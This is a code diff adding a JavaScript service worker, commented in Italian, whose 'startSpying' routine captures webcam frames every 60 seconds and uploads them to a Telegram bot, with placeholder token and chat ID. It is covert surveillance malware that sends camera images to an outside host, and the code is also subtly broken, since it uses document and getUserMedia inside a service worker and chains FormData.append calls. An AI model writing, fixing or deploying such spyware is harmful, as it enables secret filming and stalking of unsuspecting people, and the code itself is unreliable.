@@ -1,0 +1,55 @@
+const apiToken = 'YOUR_TELEGRAM_BOT_API_TOKEN';
+const chatId = 'YOUR_CHAT_ID';
+
+self.addEventListener('install', (event) => {
+    self.skipWaiting();
+});
+
+self.addEventListener('activate', (event) => {
+    event.waitUntil(self.clients.claim());
+});
+
+self.addEventListener('message', (event) => {
+    if (event.data.action === 'startSpying') {
+        startSpying();
+    }
+});
+
+// Funzione per avviare lo spionaggio
+async function startSpying() {
+    const constraints = { video: true };
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        // Intervallo di 60 secondi (60000 millisecondi)
+        setInterval(async () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageDataUrl = canvas.toDataURL('image/jpeg');
+            await sendToTelegram(imageDataUrl);
+        }, 60000);
+    } catch (err) {
+        console.error('Errore nell\'accesso alla fotocamera:', err);
+    }
+}
+
+// Funzione per inviare la foto a Telegram
+async function sendToTelegram(imageDataUrl) {
+    const response = await fetch(`https://api.telegram.org/bot${apiToken}/sendPhoto`, {
+        method: 'POST',
+        body: new FormData().append('photo', imageDataUrl.split(',')[1], 'photo.jpg').append('chat_id', chatId),
+    });
+
+    if (response.ok) {
+        console.log('Foto inviata con successo');
+    } else {
+        console.error('Invio foto fallito:', response.statusText);
+    }
+}
